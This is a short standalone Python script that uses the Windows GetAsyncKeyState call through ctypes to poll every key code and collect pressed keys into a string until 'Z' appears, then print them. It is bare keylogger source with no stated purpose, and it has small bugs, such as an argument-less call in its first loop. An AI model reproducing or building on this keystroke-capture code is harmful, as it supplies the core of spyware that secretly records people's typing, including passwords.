#-*-coding: utf-8-*-
from ctypes import *
from sys import stdout
from time import sleep
gas = cdll.user32.GetAsyncKeyState

def main():
	for i in range(0, 256):
		i = gas()
	text = ""
	while "Z" not in text:
		for i in range(0, 255):
			if gas(i):
				text += chr(i)
			sleep(0.0000000000001)
		stdout.flush()
	print(text)

if __name__ == '__main__':
	main()

